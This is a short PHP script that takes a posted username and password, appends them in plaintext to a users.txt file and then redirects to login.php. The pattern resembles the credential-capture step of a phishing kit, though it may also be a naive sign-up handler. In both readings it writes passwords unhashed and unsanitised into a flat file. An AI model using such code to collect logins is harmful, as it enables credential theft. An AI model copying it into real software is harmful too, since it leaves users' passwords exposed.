<?php

if(isset($_POST['submit_2'])){
$Name ="
".$_POST["username"]."|";
$Pass =$_POST["password"]."|";
$file=fopen("users.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fclose($file);
}
header("location: login.php ");
?>
